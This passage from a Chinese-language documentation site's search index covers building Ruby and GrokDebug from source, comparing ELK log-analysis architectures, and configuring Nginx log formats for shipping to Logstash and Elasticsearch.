# \u5b89\u88c5\u4f9d\u8d56 yum install openssl-devel.x86_64 gcc.x86_64 -y # \u4e0b\u8f7druby wget https://ruby.taobao.org/mirrors/ruby/2.1/ruby-2.1.7.tar.gz # \u5b89\u88c5ruby tar -zxvf ruby-2.1.7.tar.gz cd ruby-2.1.7/ ./configure --prefix=/usr/local/ruby2.1.7 make make install # \u914d\u7f6e\u73af\u5883\u53d8\u91cf echo 'export PATH=/usr/local/ruby2.1.7/bin:$PATH' /etc/profile source /etc/profile # \u5b89\u88c5rubygem wget https://ftp.tw.freebsd.org/distfiles/ruby/rubygems-2.6.2.tgz tar -zxvf rubygems-2.6.2.tgz cd rubygems-2.6.2/ ruby setup.rb gem install rubygems-update -v 2.6.2 # \u66ff\u6362gem\u6e90 gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/ gem sources -l # \u521b\u5efa\u5b89\u88c5\u76ee\u5f55\u4e0e\u4e0b\u8f7dgrokdebug mkdir /usr/local/grokdebug cd /usr/local/grokdebug git clone https://github.com/nickethier/grokdebug.git mv grokdebug/* . rm -rf grokdebug/ # \u67e5\u770b\u7f3a\u5c11\u7684\u7ec4\u4ef6 ruby config.ru # \u5b89\u88c5\u7ec4\u4ef6 gem install bundler gem install cabin -v=0.5.0 gem install haml -v=3.1.7 gem install jls-grok -v=0.10.10 gem install json -v=1.7.5 gem install kgio -v=2.8.0 gem install rack -v=1.4.1 gem install rack-protection -v=1.2.0 gem install raindrops -v=0.11.0 gem install shotgun -v=0.9 gem install tilt -v=1.3.3 gem install sinatra -v=1.3.3 gem install unicorn -v=4.6.3 # \u542f\u52a8 nohup bundle exec unicorn -p 8081 -c ./unicorn","title":"\u672c\u5730\u642d\u5efaGrokDebug"},{"location":"log_analysis/grokdebugger/#grokdebug","text":"github\u5730\u5740 # \u5b89\u88c5\u4f9d\u8d56 yum install openssl-devel.x86_64 gcc.x86_64 -y # \u4e0b\u8f7druby wget https://ruby.taobao.org/mirrors/ruby/2.1/ruby-2.1.7.tar.gz # \u5b89\u88c5ruby tar -zxvf ruby-2.1.7.tar.gz cd ruby-2.1.7/ ./configure --prefix=/usr/local/ruby2.1.7 make make install # \u914d\u7f6e\u73af\u5883\u53d8\u91cf echo 'export PATH=/usr/local/ruby2.1.7/bin:$PATH' /etc/profile source /etc/profile # \u5b89\u88c5rubygem wget https://ftp.tw.freebsd.org/distfiles/ruby/rubygems-2.6.2.tgz tar -zxvf rubygems-2.6.2.tgz cd rubygems-2.6.2/ ruby setup.rb gem install rubygems-update -v 2.6.2 # \u66ff\u6362gem\u6e90 gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/ gem sources -l # \u521b\u5efa\u5b89\u88c5\u76ee\u5f55\u4e0e\u4e0b\u8f7dgrokdebug mkdir /usr/local/grokdebug cd /usr/local/grokdebug git clone https://github.com/nickethier/grokdebug.git mv grokdebug/* . rm -rf grokdebug/ # \u67e5\u770b\u7f3a\u5c11\u7684\u7ec4\u4ef6 ruby config.ru # \u5b89\u88c5\u7ec4\u4ef6 gem install bundler gem install cabin -v=0.5.0 gem install haml -v=3.1.7 gem install jls-grok -v=0.10.10 gem install json -v=1.7.5 gem install kgio -v=2.8.0 gem install rack -v=1.4.1 gem install rack-protection -v=1.2.0 gem install raindrops -v=0.11.0 gem install shotgun -v=0.9 gem install tilt -v=1.3.3 gem install sinatra -v=1.3.3 gem install unicorn -v=4.6.3 # \u542f\u52a8 nohup bundle exec unicorn -p 8081 -c ./unicorn","title":"\u672c\u5730\u642d\u5efaGrokDebug"},{"location":"log_analysis/log_analysis/","text":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784 \u65e5\u5fd7\u5206\u6790\u5e38\u89c1\u67b6\u6784 \u5907\u6ce8\uff1a\u672c\u5c0f\u8282\u975e\u539f\u521b\uff0c\u539f\u6587\u5730\u5740\u5728\u53c2\u8003\u8d44\u6599\u4e2d \u57fa\u7840\u7684ELK\u67b6\u6784 \u4f18\u70b9 \uff1a\u642d\u5efa\u7b80\u6613\u3001\u6613\u4e8e\u4e0a\u624b\u3002 \u7f3a\u70b9 \uff1aLogstash\u6d88\u8017\u8d44\u6e90\u5927\uff0c\u8fd0\u884c\u5360\u7528CPU\u548c\u5185\u5b58\u9ad8\uff0c\u6ca1\u6709\u6d88\u606f\u961f\u5217\u7f13\u5b58\uff0c\u5bb9\u6613\u51fa\u73b0\u6570\u636e\u4e22\u5931\u9690\u60a3\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u5c0f\u89c4\u6a21\u96c6\u7fa4\u65b9\u6848\u3002 \u5f15\u5165\u6d88\u606f\u961f\u5217\u7684\u67b6\u6784 \u4f18\u70b9 \uff1a\u5f15\u5165\u6d88\u606f\u961f\u5217\u673a\u5236\uff0c\u5747\u8861\u4e86\u7f51\u7edc\u4f20\u8f93\uff0c\u4ece\u800c\u964d\u4f4e\u4e86\u7f51\u7edc\u95ed\u585e\u5c24\u5176\u662f\u6570\u636e\u4e22\u5931\u7684\u53ef\u80fd\u6027\u3002 \u7f3a\u70b9 \uff1a\u4f9d\u7136\u5b58\u50a8Logstash\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8fc7\u591a\u7684\u95ee\u9898\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u8f83\u5927\u7684\u96c6\u7fa4\u65b9\u6848\u3002 \u5f15\u5165Logstash-Forwarder\u67b6\u6784 \u4f18\u70b9 \uff1a\u89e3\u51b3\u4e86Logstash\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8fc7\u591a\u7684\u95ee\u9898\u3002Logstash-Forwarder\u4e0eLogstash\u95f4\u7684\u901a\u4fe1\u662fSSL\u52a0\u5bc6\u4f20\u8f93\uff0c\u8d77\u5230\u5b89\u5168\u4fdd\u969c\u4f5c\u7528\u3002 \u7f3a\u70b9 \uff1a\u7531\u4e8eSSL\u52a0\u5bc6\u4f20\u5230\u4ece\u800c\u5bfc\u81f4\u7684\u9650\u5236\u6027\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u8f83\u5927\u7684\u96c6\u7fa4\u65b9\u6848\u3002 \u5f15\u5165Beats\u7cfb\u5217\u67b6\u6784 \u4f18\u70b9 \uff1a\u63d0\u9ad8\u4e86\u6269\u5c55\u6027\u548c\u7075\u6d3b\u6027\uff0cBeats\u7cfb\u5217\u4e5f\u65b9\u4fbf\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\u3002 \u6211\u7684\u65e5\u5fd7\u5206\u6790\u67b6\u6784 \u65e5\u5fd7\u5206\u6790\u67b6\u6784V1.0 \u914d\u7f6e\u597dNginx\u65e5\u5fd7\u683c\u5f0f\uff1b \u4f7f\u7528rsyslog\u5c06Nginx\u65e5\u5fd7\u4f20\u8f93\u5230Kafka\u4e2d\uff1b Logstash\u6d88\u8d39Kafka\u6d88\u606f\uff0c\u5e76\u5bf9\u6d88\u606f\u8fdb\u884c\u683c\u5f0f\u5316\u5904\u7406\u540e\u5b58\u50a8\u5230ES\u4e2d\uff1b Kibana\u5bf9ES\u4e2d\u7684\u6d88\u606f\u8fdb\u884c\u56fe\u8868\u5c55\u793a\u5e76\u63d0\u4f9b\u67e5\u8be2\u529f\u80fd\uff1b \u540c\u65f6\u4f7f\u7528Python ElasticSearch\u6a21\u5757\u5bf9\u6570\u636e\u8fdb\u884c\u67e5\u8be2\u5206\u6790\uff0c\u5f97\u5230\u4e00\u4e9b\u53ef\u7591\u7684IP\u5e76\u5c06\u8fd9\u4e9b\u53ef\u7591IP\u5b58\u50a8\u5230\u6570\u636e\u5e93\u4e2d\uff1b \u5229\u7528\u60c5\u62a5\u6570\u636e\u5206\u6790\u53ef\u7591\u5230IP\uff0c\u8bbe\u5b9a\u89c4\u5219\uff0c\u5f53\u89e6\u53d1\u89c4\u5219\u65f6\uff0c\u4f7f\u7528ansible\u6279\u91cf\u6267\u884ciptables\u547d\u4ee4\u5c01\u7981\u8be5IP\uff1b \u5c01\u7981\u7684\u540c\u65f6\u8bb0\u5f55\u8be5IP\u89e6\u53d1\u7684\u89c4\u5219\uff0c\u5c01\u7981\u65f6\u95f4\uff1b \u6839\u636e\u4e0d\u540c\u7684\u89c4\u5219\u8bbe\u5b9a\u4e0d\u540c\u7684\u5c01\u7981\u65f6\u95f4\uff0c\u5f53\u8d85\u8fc7\u5c01\u7981\u65f6\u95f4\u65f6\uff0c\u4f7f\u7528iptables\u89e3\u5c01\u8be5IP\uff1b \u4e3a\u907f\u514d\u8bef\u6740\uff0c\u9700\u8981\u63d0\u4f9b\u624b\u52a8\u89e3\u5c01\u7684\u80fd\u529b\uff1b \u5907\u6ce8\uff1a\u9002\u7528\u4e8e\u5c0f\u516c\u53f8\uff0c\u4e14\u9488\u5bf9CDN\u3001SLB\u4e0d\u590d\u6742\u7684\u7f51\u7ad9\u67b6\u6784\u3002 \u65e5\u5fd7\u5206\u6790\u67b6\u6784V2.0 \u6570\u636e\u5c42\u9762\u53ef\u4ee5\u662f\u591a\u79cd\u591a\u6837\u7684\uff0c\u4e0d\u4e00\u5b9a\u4ec5\u9650\u4e8eaccess_log\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u65e5\u5fd7\u3001\u5b89\u5168\u8bbe\u5907\u65e5\u5fd7\u7b49\u3002 \u91c7\u96c6\u5c42\u63a8\u8350\u4f7f\u7528Beats\u7cfb\u5217\uff0c\u4e0eELK\u878d\u5408\u5ea6\u9ad8\uff0c\u4e5f\u4fbf\u4e8e\u62d3\u5c55\u3002 \u5206\u4e3a\u79bb\u7ebf\u5206\u6790\u4e0e\u51c6\u5b9e\u65f6\u5206\u6790\u4e24\u6761\u7ebf\uff0c\u79bb\u7ebf\u5206\u6790\u4e3b\u8981\u662f\u4e3a\u4e86\u7ed9\u51c6\u5b9e\u65f6\u5206\u6790\u63d0\u4f9b\u89c4\u5219\u3002 \u51c6\u5b9e\u65f6\u5206\u6790\u7684\u7ed3\u679c\u9700\u8981\u8fd0\u8425\u4eba\u5458\u8fdb\u884c\u5904\u7406\u3002 \u5907\u6ce8\uff1a\u65e2\u9002\u7528\u4e8e\u5e38\u89c4\u7684\u65e5\u5fd7\u5206\u6790\uff0c\u4e5f\u9002\u7528\u4e8e\u98ce\u63a7\u7cfb\u7edf\u7684\u5206\u6790\u65b9\u5f0f \u53c2\u8003\u8d44\u6599 ELK\u7b80\u4ecb\u53ca\u67b6\u6784\u5206\u6790","title":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784"},{"location":"log_analysis/log_analysis/#_1","text":"","title":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784"},{"location":"log_analysis/log_analysis/#_2","text":"\u5907\u6ce8\uff1a\u672c\u5c0f\u8282\u975e\u539f\u521b\uff0c\u539f\u6587\u5730\u5740\u5728\u53c2\u8003\u8d44\u6599\u4e2d","title":"\u65e5\u5fd7\u5206\u6790\u5e38\u89c1\u67b6\u6784"},{"location":"log_analysis/log_analysis/#elk","text":"\u4f18\u70b9 \uff1a\u642d\u5efa\u7b80\u6613\u3001\u6613\u4e8e\u4e0a\u624b\u3002 \u7f3a\u70b9 \uff1aLogstash\u6d88\u8017\u8d44\u6e90\u5927\uff0c\u8fd0\u884c\u5360\u7528CPU\u548c\u5185\u5b58\u9ad8\uff0c\u6ca1\u6709\u6d88\u606f\u961f\u5217\u7f13\u5b58\uff0c\u5bb9\u6613\u51fa\u73b0\u6570\u636e\u4e22\u5931\u9690\u60a3\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u5c0f\u89c4\u6a21\u96c6\u7fa4\u65b9\u6848\u3002","title":"\u57fa\u7840\u7684ELK\u67b6\u6784"},{"location":"log_analysis/log_analysis/#_3","text":"\u4f18\u70b9 \uff1a\u5f15\u5165\u6d88\u606f\u961f\u5217\u673a\u5236\uff0c\u5747\u8861\u4e86\u7f51\u7edc\u4f20\u8f93\uff0c\u4ece\u800c\u964d\u4f4e\u4e86\u7f51\u7edc\u95ed\u585e\u5c24\u5176\u662f\u6570\u636e\u4e22\u5931\u7684\u53ef\u80fd\u6027\u3002 \u7f3a\u70b9 \uff1a\u4f9d\u7136\u5b58\u50a8Logstash\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8fc7\u591a\u7684\u95ee\u9898\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u8f83\u5927\u7684\u96c6\u7fa4\u65b9\u6848\u3002","title":"\u5f15\u5165\u6d88\u606f\u961f\u5217\u7684\u67b6\u6784"},{"location":"log_analysis/log_analysis/#logstash-forwarder","text":"\u4f18\u70b9 \uff1a\u89e3\u51b3\u4e86Logstash\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8fc7\u591a\u7684\u95ee\u9898\u3002Logstash-Forwarder\u4e0eLogstash\u95f4\u7684\u901a\u4fe1\u662fSSL\u52a0\u5bc6\u4f20\u8f93\uff0c\u8d77\u5230\u5b89\u5168\u4fdd\u969c\u4f5c\u7528\u3002 \u7f3a\u70b9 \uff1a\u7531\u4e8eSSL\u52a0\u5bc6\u4f20\u5230\u4ece\u800c\u5bfc\u81f4\u7684\u9650\u5236\u6027\u3002 \u5e94\u7528\u573a\u666f \uff1a\u9002\u7528\u8f83\u5927\u7684\u96c6\u7fa4\u65b9\u6848\u3002","title":"\u5f15\u5165Logstash-Forwarder\u67b6\u6784"},{"location":"log_analysis/log_analysis/#beats","text":"\u4f18\u70b9 \uff1a\u63d0\u9ad8\u4e86\u6269\u5c55\u6027\u548c\u7075\u6d3b\u6027\uff0cBeats\u7cfb\u5217\u4e5f\u65b9\u4fbf\u8fdb\u884c\u4e8c\u6b21\u5f00\u53d1\u3002","title":"\u5f15\u5165Beats\u7cfb\u5217\u67b6\u6784"},{"location":"log_analysis/log_analysis/#_4","text":"","title":"\u6211\u7684\u65e5\u5fd7\u5206\u6790\u67b6\u6784"},{"location":"log_analysis/log_analysis/#v10","text":"\u914d\u7f6e\u597dNginx\u65e5\u5fd7\u683c\u5f0f\uff1b \u4f7f\u7528rsyslog\u5c06Nginx\u65e5\u5fd7\u4f20\u8f93\u5230Kafka\u4e2d\uff1b Logstash\u6d88\u8d39Kafka\u6d88\u606f\uff0c\u5e76\u5bf9\u6d88\u606f\u8fdb\u884c\u683c\u5f0f\u5316\u5904\u7406\u540e\u5b58\u50a8\u5230ES\u4e2d\uff1b Kibana\u5bf9ES\u4e2d\u7684\u6d88\u606f\u8fdb\u884c\u56fe\u8868\u5c55\u793a\u5e76\u63d0\u4f9b\u67e5\u8be2\u529f\u80fd\uff1b \u540c\u65f6\u4f7f\u7528Python ElasticSearch\u6a21\u5757\u5bf9\u6570\u636e\u8fdb\u884c\u67e5\u8be2\u5206\u6790\uff0c\u5f97\u5230\u4e00\u4e9b\u53ef\u7591\u7684IP\u5e76\u5c06\u8fd9\u4e9b\u53ef\u7591IP\u5b58\u50a8\u5230\u6570\u636e\u5e93\u4e2d\uff1b \u5229\u7528\u60c5\u62a5\u6570\u636e\u5206\u6790\u53ef\u7591\u5230IP\uff0c\u8bbe\u5b9a\u89c4\u5219\uff0c\u5f53\u89e6\u53d1\u89c4\u5219\u65f6\uff0c\u4f7f\u7528ansible\u6279\u91cf\u6267\u884ciptables\u547d\u4ee4\u5c01\u7981\u8be5IP\uff1b \u5c01\u7981\u7684\u540c\u65f6\u8bb0\u5f55\u8be5IP\u89e6\u53d1\u7684\u89c4\u5219\uff0c\u5c01\u7981\u65f6\u95f4\uff1b \u6839\u636e\u4e0d\u540c\u7684\u89c4\u5219\u8bbe\u5b9a\u4e0d\u540c\u7684\u5c01\u7981\u65f6\u95f4\uff0c\u5f53\u8d85\u8fc7\u5c01\u7981\u65f6\u95f4\u65f6\uff0c\u4f7f\u7528iptables\u89e3\u5c01\u8be5IP\uff1b \u4e3a\u907f\u514d\u8bef\u6740\uff0c\u9700\u8981\u63d0\u4f9b\u624b\u52a8\u89e3\u5c01\u7684\u80fd\u529b\uff1b \u5907\u6ce8\uff1a\u9002\u7528\u4e8e\u5c0f\u516c\u53f8\uff0c\u4e14\u9488\u5bf9CDN\u3001SLB\u4e0d\u590d\u6742\u7684\u7f51\u7ad9\u67b6\u6784\u3002","title":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784V1.0"},{"location":"log_analysis/log_analysis/#v20","text":"\u6570\u636e\u5c42\u9762\u53ef\u4ee5\u662f\u591a\u79cd\u591a\u6837\u7684\uff0c\u4e0d\u4e00\u5b9a\u4ec5\u9650\u4e8eaccess_log\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u65e5\u5fd7\u3001\u5b89\u5168\u8bbe\u5907\u65e5\u5fd7\u7b49\u3002 \u91c7\u96c6\u5c42\u63a8\u8350\u4f7f\u7528Beats\u7cfb\u5217\uff0c\u4e0eELK\u878d\u5408\u5ea6\u9ad8\uff0c\u4e5f\u4fbf\u4e8e\u62d3\u5c55\u3002 \u5206\u4e3a\u79bb\u7ebf\u5206\u6790\u4e0e\u51c6\u5b9e\u65f6\u5206\u6790\u4e24\u6761\u7ebf\uff0c\u79bb\u7ebf\u5206\u6790\u4e3b\u8981\u662f\u4e3a\u4e86\u7ed9\u51c6\u5b9e\u65f6\u5206\u6790\u63d0\u4f9b\u89c4\u5219\u3002 \u51c6\u5b9e\u65f6\u5206\u6790\u7684\u7ed3\u679c\u9700\u8981\u8fd0\u8425\u4eba\u5458\u8fdb\u884c\u5904\u7406\u3002 \u5907\u6ce8\uff1a\u65e2\u9002\u7528\u4e8e\u5e38\u89c4\u7684\u65e5\u5fd7\u5206\u6790\uff0c\u4e5f\u9002\u7528\u4e8e\u98ce\u63a7\u7cfb\u7edf\u7684\u5206\u6790\u65b9\u5f0f","title":"\u65e5\u5fd7\u5206\u6790\u67b6\u6784V2.0"},{"location":"log_analysis/log_analysis/#_5","text":"ELK\u7b80\u4ecb\u53ca\u67b6\u6784\u5206\u6790","title":"\u53c2\u8003\u8d44\u6599"},{"location":"log_analysis/nginx_log/","text":"Nginx\u914d\u7f6e\u65e5\u5fd7\u683c\u5f0f \u521d\u59cb\u5316\u914d\u7f6e log_format main '$remote_addr - $remote_user [$time_local] $request ' '$status $body_bytes_sent $http_referer ' ' $http_user_agent $http_x_forwarded_for '; \u914d\u7f6e\u4e3aJSON\u683c\u5f0f\u5e76\u6dfb\u52a0\u5b57\u6bb5 log_format main escape=json '{ @timestamp : $time_local , ' ' remote_addr : $remote_addr ,' ' remote_port : $remote_port ,' ' scheme : $scheme ,' ' request_uri : $request_uri ,' ' request_method : $request_method ,' ' request_time : $request_time ,' ' request_length : $request_length ,' ' response_status : $status ,' ' body_bytes_sent : $body_bytes_sent ,' ' http_referer : $http_referer ,' ' http_user_agent : $http_user_agent ,' ' http_x_forwarded_for : $http_x_forwarded_for ,' ' upstream_addr : $upstream_addr ,' ' upstream_response_time : $upstream_response_time }'; Nginx\u65e5\u5fd7\u5b57\u6bb5\u542b\u4e49 \u5b57\u6bb5 \u542b\u4e49 \u793a\u4f8b - \u5360\u4f4d\u7b26 - body_bytes_sent \u54cd\u5e94body\u5b57\u8282\u6570 3650 bytes_sent \u54cd\u5e94\u603b\u5b57\u8282\u6570 175 host IP\u6216\u57df\u540d(\u4e0d\u5305\u62ec\u7aef\u53e3) 10.10.10.14 http_host IP\u6216\u57df\u540d(\u5305\u62ec\u7aef\u53e3) 10.10.10.14:81 http_referer referer\u4fe1\u606f http://10.10.10.14/ http_user_agent UA\u4fe1\u606f Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 http_x_forwarded_for XFF\u4fe1\u606f 192.168.1.1 remote_addr \u5ba2\u6237\u7aef\u5730\u5740 10.10.10.1 remote_user \u5ba2\u6237\u7aef\u8ba4\u8bc1\u7528\u6237\u540d admin request \u8bf7\u6c42URI\u548c\u534f\u8bae GET /favicon.ico HTTP/1.1 request_body \u8bf7\u6c42\u7684body request_length \u8bf7\u6c42\u957f\u5ea6 571 request_method \u8bf7\u6c42\u65b9\u6cd5 GET request_time \u8bf7\u6c42\u5904\u7406\u65f6\u95f4 0.000 response_body \u8fd4\u56de\u7684body response_header_data \u54cd\u5e94\u5934\u6570\u636e schema \u534f\u8bae http server_name \u865a\u62df\u4e3b\u673a\u540d\u79f0 server_port \u670d\u52a1\u5668\u7aef\u53e3 server_protocol \u670d\u52a1\u5668\u534f\u8bae ssl_cipher \u4ea4\u6362\u6570\u636e\u4e2d\u7684\u7b97\u6cd5 ssl_protocol SSL\u534f\u8bae\u7248\u672c status \u8fd4\u56de\u72b6\u6001\u7801 404 time_local \u65f6\u95f4\u6233 16/Jun/2019:23:29:50 -0400 upstream_addr \u540e\u7aef\u63d0\u4f9b\u670d\u52a1\u5730\u5740 upstream_connect_time \u4e0e\u670d\u52a1\u5668\u8fde\u63a5\u6240\u82b1\u8d39\u7684\u65f6\u95f4 upstream_response_time \u540e\u7aef\u5904\u7406\u65f6\u95f4 upstream_status upstream\u72b6\u6001 200 \u6253\u5370body\u4fe1\u606f \u6253\u5370request_body # web_server\u914d\u7f6e # The variable\u2019s value is made available in locations processed by the proxy_pass, fastcgi_pass, uwsgi_pass, and scgi_pass directives when the request body was read to a memory buffer. # \u610f\u5473\u7740\uff1a\u53ea\u6709location\u4e2d\u7528\u5230proxy_pass\u3001fastcgi_pass\u3001scgi_pass\u547d\u4ee4\u65f6\uff0crequest_body\u624d\u6709\u503c\u3002 log_format main $request_body # \u6211\u8fd9\u91cc\u662f\u7b80\u5199 location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } \u6253\u5370response_body # web_server\u914d\u7f6e log_format main $response_body # \u6211\u8fd9\u91cc\u662f\u7b80\u5199 server { listen 80; server_name localhost; lua_need_request_body on; set $response_body ; body_filter_by_lua ' local response_body = string.sub(ngx.arg[1],1,1000) ngx.ctx.buffered = (ngx.ctx.buffered or ) .. response_body if ngx.arg[2] then ngx.var.response_body = ngx.ctx.buffered end '; location ~ \\.php$ { root /usr/local/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } \u5b8c\u6574\u7684Nginx\u65e5\u5fd7\u914d\u7f6e log_format main escape=json '{ @timestamp : $time_local , ' ' remote_addr : $remote_addr ,' ' remote_port : $remote_port ,' ' scheme : $scheme ,' ' request_uri : $request_uri ,' ' request_method : $request_method ,' ' request_time : $request_time ,' ' request_length : $request_length ,' ' response_status : $status ,' ' body_bytes_sent : $body_bytes_sent ,' ' http_referer : $http_referer ,' ' http_user_agent : $http_user_agent ,' ' http_x_forwarded_for : $http_x_forwarded_for ,' ' upstream_addr : $upstream_addr ,' ' upstream_response_time : $upstream_response_time ,' ' request_body : $request_body , ' ' response_body : $response_body }'; \u6ce8\u610f\u4e8b\u9879 request_body\u4e0eresponse_body\u5982\u679c\u5728\u4e0a\u4f20\u6587\u4ef6\u6216\u8005\u4e0b\u8f7d\u6587\u4ef6\u65f6\uff0cbody\u5185\u5bb9\u4f1a\u5f88\u5927\uff0c\u9700\u8981\u8003\u8651\u5bf9\u6027\u80fd\u548c\u5b58\u50a8\u7684\u5f71\u54cd\u3002 \u5bf9\u4e8etimestamp\u53c2\u6570\uff0c\u53ef\u4ee5\u4e0d\u4f7f\u7528time_local\u800c\u4f7f\u7528time_iso8601\u3002 \u5982\u679c\u8fd0\u7ef4\u5bf9\u4e8e\u7f51\u7edc\u7684\u6027\u80fd\u6709\u8981\u6c42\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528$tcpinfo_rtt, $tcpinfo_rttvar, $tcpinfo_snd_cwnd, $tcpinfo_rcv_space\u3002 Nginx\u65e5\u5fd7\u76f4\u63a5\u8f93\u51fa\u5230Logstash log_format logstash '$remote_addr - $remote_user [$time_local] $request ' '$status $body_bytes_sent $http_referer ' ' $http_user_agent $http_x_forwarded_for '; access_log syslog:server=127.0.0.1:514,nohostname,tag=nginx_access_log logstash; Logstash\u914d\u7f6e input { udp { host = 127.0.0.1 port = 514 } } output { stdout {} }","title":"Nginx\u914d\u7f6e\u65e5\u5fd7\u683c\u5f0f"},{"location":"log_analysis/nginx_log/#nginx","text":"","title":"Nginx\u914d\u7f6e\u65e5\u5fd7\u683c\u5f0f"},{"location":"log_analysis/nginx_log/#_1","text":"log_format main '$remote_addr - $remote_user [$time_local] $request ' '$status $body_bytes_sent $http_referer ' ' $http_user_agent $http_x_forwarded_for ';","title":"\u521d\u59cb\u5316\u914d\u7f6e"},{"location":"log_analysis/nginx_log/#json","text":"log_format main escape=json '{ @timestamp : $time_local , ' ' remote_addr : $remote_addr ,' ' remote_port : $remote_port ,' ' scheme : $scheme ,' ' request_uri : $request_uri ,' ' request_method : $request_method ,' ' request_time : $request_time ,' ' request_length : $request_length ,' ' response_status : $status ,' ' body_bytes_sent : $body_bytes_sent ,' ' http_referer : $http_referer ,' ' http_user_agent : $http_user_agent ,' ' http_x_forwarded_for : $http_x_forwarded_for ,' ' upstream_addr : $upstream_addr ,' ' upstream_response_time : $upstream_response_time }';","title":"\u914d\u7f6e\u4e3aJSON\u683c\u5f0f\u5e76\u6dfb\u52a0\u5b57\u6bb5"},{"location":"log_analysis/nginx_log/#nginx_1","text":"\u5b57\u6bb5 \u542b\u4e49 \u793a\u4f8b - \u5360\u4f4d\u7b26 - body_bytes_sent \u54cd\u5e94body\u5b57\u8282\u6570 3650 bytes_sent \u54cd\u5e94\u603b\u5b57\u8282\u6570 175 host IP\u6216\u57df\u540d(\u4e0d\u5305\u62ec\u7aef\u53e3) 10.10.10.14 http_host IP\u6216\u57df\u540d(\u5305\u62ec\u7aef\u53e3) 10.10.10.14:81 http_referer referer\u4fe1\u606f http://10.10.10.14/ http_user_agent UA\u4fe1\u606f Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 http_x_forwarded_for XFF\u4fe1\u606f 192.168.1.1 remote_addr \u5ba2\u6237\u7aef\u5730\u5740 10.10.10.1 remote_user \u5ba2\u6237\u7aef\u8ba4\u8bc1\u7528\u6237\u540d admin request \u8bf7\u6c42URI\u548c\u534f\u8bae GET /favicon.ico HTTP/1.1 request_body \u8bf7\u6c42\u7684body request_length \u8bf7\u6c42\u957f\u5ea6 571 request_method \u8bf7\u6c42\u65b9\u6cd5 GET request_time \u8bf7\u6c42\u5904\u7406\u65f6\u95f4 0.000 response_body \u8fd4\u56de\u7684body response_header_data \u54cd\u5e94\u5934\u6570\u636e schema \u534f\u8bae http server_name \u865a\u62df\u4e3b\u673a\u540d\u79f0 server_port \u670d\u52a1\u5668\u7aef\u53e3 server_protocol \u670d\u52a1\u5668\u534f\u8bae ssl_cipher \u4ea4\u6362\u6570\u636e\u4e2d\u7684\u7b97\u6cd5 ssl_protocol SSL\u534f\u8bae\u7248\u672c status \u8fd4\u56de\u72b6\u6001\u7801 404 time_local \u65f6\u95f4\u6233 16/Jun/2019:23:29:50 -0400 upstream_addr \u540e\u7aef\u63d0\u4f9b\u670d\u52a1\u5730\u5740 upstream_connect_time \u4e0e\u670d\u52a1\u5668\u8fde\u63a5\u6240\u82b1\u8d39\u7684\u65f6\u95f4 upstream_response_time \u540e\u7aef\u5904\u7406\u65f6\u95f4 upstream_status upstream\u72b6\u6001 200","title":"Nginx\u65e5\u5fd7\u5b57\u6bb5\u542b\u4e49"},{"location":"log_analysis/nginx_log/#body","text":"","title":"\u6253\u5370body\u4fe1\u606f"},{"location":"log_analysis/nginx_log/#request_body","text":"# web_server\u914d\u7f6e # The variable\u2019s value is made available in locations processed by the proxy_pass, fastcgi_pass, uwsgi_pass, and scgi_pass directives when the request body was read to a memory buffer. # \u610f\u5473\u7740\uff1a\u53ea\u6709location\u4e2d\u7528\u5230proxy_pass\u3001fastcgi_pass\u3001scgi_pass\u547d\u4ee4\u65f6\uff0crequest_body\u624d\u6709\u503c\u3002 log_format main $request_body # \u6211\u8fd9\u91cc\u662f\u7b80\u5199 location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; }","title":"\u6253\u5370request_body"},{"location":"log_analysis/nginx_log/#response_body","text":"# web_server\u914d\u7f6e log_format main $response_body # \u6211\u8fd9\u91cc\u662f\u7b80\u5199 server { listen 80; server_name localhost; lua_need_request_body on; set $response_body ; body_filter_by_lua ' local response_body = string.sub(ngx.arg[1],1,1000) ngx.ctx.buffered = (ngx.ctx.buffered or ) .. response_body if ngx.arg[2] then ngx.var.response_body = ngx.ctx.buffered end '; location ~ \\.php$ { root /usr/local/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } }","title":"\u6253\u5370response_body"},{"location":"log_analysis/nginx_log/#nginx_2","text":"log_format main escape=json '{ @timestamp : $time_local , ' ' remote_addr : $remote_addr ,' ' remote_port : $remote_port ,' ' scheme : $scheme ,' ' request_uri : $request_uri ,' ' request_method : $request_method ,' ' request_time : $request_time ,' ' request_length : $request_length ,' ' response_status : $status ,' ' body_bytes_sent : $body_bytes_sent ,' ' http_referer : $http_referer ,' ' http_user_agent : $http_user_agent ,' ' http_x_forwarded_for : $http_x_forwarded_for ,' ' upstream_addr : $upstream_addr ,' ' upstream_response_time : $upstream_response_time ,' ' request_body : $request_body , 